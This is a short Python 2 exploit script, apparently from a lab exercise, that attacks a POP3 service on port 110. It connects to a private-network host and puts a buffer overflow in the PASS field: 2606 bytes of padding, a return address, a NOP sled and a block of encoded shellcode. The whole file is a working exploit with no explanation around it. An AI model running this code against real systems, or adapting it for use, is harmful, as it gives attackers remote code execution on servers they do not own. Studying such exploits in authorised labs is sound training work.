#!/usr/bin/python
import sys, socket

buff = ("\xbb\x78\xf0\xb8\x27\xd9\xe8\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\x22\xfe\x5a\xd2\x2e\x16\x18"
"\x1d\xce\xe7\x7d\x97\x2b\xd6\xbd\xc3\x38\x49\x0e\x87\x6c\x66"
"\xe5\xc5\x84\xfd\x8b\xc1\xab\xb6\x26\x34\x82\x47\x1a\x04\x85"
"\xcb\x61\x59\x65\xf5\xa9\xac\x64\x32\xd7\x5d\x34\xeb\x93\xf0"
"\xa8\x98\xee\xc8\x43\xd2\xff\x48\xb0\xa3\xfe\x79\x67\xbf\x58"
"\x5a\x86\x6c\xd1\xd3\x90\x71\xdc\xaa\x2b\x41\xaa\x2c\xfd\x9b"
"\x53\x82\xc0\x13\xa6\xda\x05\x93\x59\xa9\x7f\xe7\xe4\xaa\x44"
"\x95\x32\x3e\x5e\x3d\xb0\x98\xba\xbf\x15\x7e\x49\xb3\xd2\xf4"
"\x15\xd0\xe5\xd9\x2e\xec\x6e\xdc\xe0\x64\x34\xfb\x24\x2c\xee"
"\x62\x7d\x88\x41\x9a\x9d\x73\x3d\x3e\xd6\x9e\x2a\x33\xb5\xf6"
"\x9f\x7e\x45\x07\x88\x09\x36\x35\x17\xa2\xd0\x75\xd0\x6c\x27"
"\x79\xcb\xc9\xb7\x84\xf4\x29\x9e\x42\xa0\x79\x88\x63\xc9\x11"
"\x48\x8b\x1c\xb5\x18\x23\xcf\x76\xc8\x83\xbf\x1e\x02\x0c\x9f"
"\x3f\x2d\xc6\x88\xaa\xd4\x81\x76\x82\xdc\x58\x1f\xd1\xe0\x4b"
"\x83\x5c\x06\x01\x2b\x09\x91\xbe\xd2\x10\x69\x5e\x1a\x8f\x14"
"\x60\x90\x3c\xe9\x2f\x51\x48\xf9\xd8\x91\x07\xa3\x4f\xad\xbd"
"\xcb\x0c\x3c\x5a\x0b\x5a\x5d\xf5\x5c\x0b\x93\x0c\x08\xa1\x8a"
"\xa6\x2e\x38\x4a\x80\xea\xe7\xaf\x0f\xf3\x6a\x8b\x2b\xe3\xb2"
"\x14\x70\x57\x6b\x43\x2e\x01\xcd\x3d\x80\xfb\x87\x92\x4a\x6b"
"\x51\xd9\x4c\xed\x5e\x34\x3b\x11\xee\xe1\x7a\x2e\xdf\x65\x8b"
"\x57\x3d\x16\x74\x82\x85\x26\x3f\x8e\xac\xae\xe6\x5b\xed\xb2"
"\x18\xb6\x32\xcb\x9a\x32\xcb\x28\x82\x37\xce\x75\x04\xa4\xa2"
"\xe6\xe1\xca\x11\x06\x20")

shellcode = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + buff

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.10.178',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + shellcode + '\r\n')
except:
	print "Error Connecting to server"
